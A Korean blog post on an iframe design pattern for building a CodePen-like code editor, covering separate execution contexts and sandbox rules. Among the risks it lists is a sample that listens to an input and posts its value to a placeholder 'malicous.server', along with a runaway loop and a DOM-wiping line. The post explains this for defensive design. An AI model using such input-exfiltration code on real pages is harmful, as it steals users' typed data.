---
layout: single
title: "코드 에디터를 만들기 위한 iframe 디자인 패턴"
categories: HTML
tag: [HTML, CodePen Project]
---

## 코드 에디터를 만들기 위한 iframe 디자인 패턴

#### 개발 목표

Code Pen이라는 사이트가 있다. - https://codepen.io/
해당 사이트와 같이 iframe을 사용하여 코드를 번들링하여 보여주는 사이트를 만들고자 한다.

<br>
#### 발생할 수 있는 문제점

Code Pen과 같은 실시간 코드 번들링 사이트를 만들면 아래와 같은 이슈 또는 문제점에 직면할 수 있다.

1. 코드 입력창에 오류를 발생시키는 문법이 잘못된 코드가 작성될 수 있다.

2. DOM을 조작하는 코드로 인해 예상하지 못한 현상이 발생할 수 있다.
   ex) document.body.innerHTML = '';
3. 악의적인 코드를 입력창에 넣을 수 있다.
   ex) document.querySelector('input).addEventListener('change', function => {
   axios.post('malicous.server', {
   value: event.target.value
   })})
   ex) for (var i = 0; i < 99999999999999999; i++) {
   console.log(i);
   }

<br>
#### 꼭 iframe을 사용해야 될까?

상기와 같은 문제점을 해결하기 위해서 iframe을 사용해야 한다. iframe은 일반적으로 child frame이며, 그외의 요소는 parent frame에 속한다. 중요한 것은 **JavaScript execution context가 parent/child frame 별로 각각 따로 존재하고 실행된다는 것이다**. 즉, iframe에서 에러가 발생해도 iframe의 execution context만 에러가 발생하고, React에는 execution context에는 영향을 주지 않는다. 만약, iframe 내부에서 Dom을 조작하여도 프레임 내부에서만 문제가 발생한다.

추가적으로 iframe에서 parent의 변수나 프로퍼티를 가져오고 싶으면 'parent' 문법을 사용하면 된다. parent에서 iframe(child)의 변수나 프로퍼티를 가져오고 싶으면 'document.querySelector('frame').contentWindow 문법을 사용하면 된다.

> iframe은 아래와 같은 특정한 조건에서만 parent/child가 서로 접근할 수 있다.
>
> > - iframe 요소가 'sandbox' 프로퍼티가 없는 경우
> > - sandbox의 프로퍼티가 존재하지만, 'sandbox="allow-same-origin"'인 경우
> > - parent/child의 HTML document가 같은 domain, port, protocol(http vs https)인 경우

#### iframe parent/child를 서로 접근하지 못하게 하는 이유

아쉽지만 iframe의 parent/child의 요소가 서로 직접 접근할 수 있게 만들면 많은 문제점이 발생할 수 있다. 예를들어, 악의적인 사용자가 iframe에 parent의 패스워드 input 요소를 가져와 eventListener를 사용하여 패스워드를 알아낼 수 있다. 또한, 특정 서버에 현재 사용자의 쿠키 정보를 보낼 수도 있을 것이다. 이러한 이유로 Code Pen 사이트에서도 parent/child 완전히 분리하여 통신이 진행되도록 설계 되었다.

아래는 Code Pen 사이트의 데이터 흐름을 정리한 것이다.
![codepen-flowchart](/assets/images/iframe/codepen-flowchart.png "Code Pen 사이트 디자인패턴")

Code Pen 사이트에서도 'codePen.io'은 parent, 'cdpn.io'은 child(iframe)와 통신을 하도록 설계되었다.
